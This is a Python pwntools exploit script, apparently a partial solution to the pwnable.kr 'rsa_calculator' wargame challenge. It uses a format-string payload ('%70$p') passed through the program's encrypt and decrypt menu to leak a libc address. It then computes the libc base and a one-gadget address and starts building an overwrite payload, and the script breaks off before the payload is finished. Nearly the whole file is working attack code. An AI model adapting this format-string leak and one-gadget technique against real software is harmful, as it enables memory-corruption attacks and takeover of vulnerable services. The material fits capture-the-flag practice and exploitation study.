from pwn import *

def set_key_pair():
	pr = 19
	q = 37
	e = 11
	d = 59
	p.sendline("1")

	p.recvuntil("p :")
	p.sendline(str(pr))

	p.recvuntil("q :")
	p.sendline(str(q))

	p.recvuntil("e :")
	p.sendline(str(e))

	p.recvuntil("d :")
	p.sendline(str(d))


def encode(length, data):
	p.sendline("2")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("-encrypted result (hex encoded) -\n")

	return p.recvline()

def decode(length, data):
	p.sendline("3")

	p.recvuntil("how long is your data?(max=1024) : ")
	p.sendline(str(length))

	p.recvuntil("data")
	p.sendline(data)

	p.recvuntil("- decrypted result -\n")

	return p.recvline()

if __name__ == '__main__':
	libc_offset = 0x10ff8
#oneshot_offset = 0x4525A
	oneshot_offset = 0x4526A # => local
	exit = 0x602520

	p = process("./rsa_calculator")
#p = remote("pwnable.kr", 9012)

	p.recvuntil(">")
	set_key_pair()
	p.recvuntil(">")
	fsb = "%70$p" # %69$p => server
	data = encode(len(fsb), fsb)
	addr = decode(len(data), data)
	print "[Leak] : %s" % addr
	libc_base = int(addr,16) - libc_offset
	print "[Libc] : 0x%x" % libc_base
	oneshot = oneshot_offset + libc_base
	print "[OneShot] : 0x%x" % oneshot
	a = "%x" % oneshot
	print a
	pay = "602560000000000000"

